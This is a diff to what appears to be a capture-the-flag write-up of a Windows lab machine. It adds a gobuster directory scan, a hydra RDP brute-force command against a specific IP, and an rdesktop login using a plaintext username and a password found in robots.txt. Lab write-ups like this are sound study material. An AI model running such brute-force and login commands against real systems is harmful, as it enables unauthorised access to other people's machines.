@@ -70,7 +70,8 @@ http://<TARGET_IP>/robots.txt
 
 To find hidden directories, I used Gobuster.
 ```
-gobuster dir -u http://<TARGET_IP> -w <wordlist>
+gobuster dir -u ip -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --no-error -x .txt,.html,.php -t 40
+
 ```
 Result:
 
@@ -88,6 +89,10 @@ Credential information was gathered from:
 
 Password → Found from robots.txt
 
+Created a wordlist file "name" which contains words similar to the figured username
+```
+hydra -L /home/alen/name -p UmbracoIsTheBest! rdp://10.80.148.21
+```
 Username → Identified from a poem displayed on the website
 
 This highlighted how information disclosure can lead to authentication bypass.
@@ -96,7 +101,8 @@ This highlighted how information disclosure can lead to authentication bypass.
 
 ince RDP (port 3389) was open, I used rdesktop to connect to the Windows machine.
 ```
-rdesktop <TARGET_IP> -u <USERNAME> -p <PASSWORD>
+rdesktop IP -u SG -p UmbracoIsTheBest!
+
 
 ```
 Outcome:
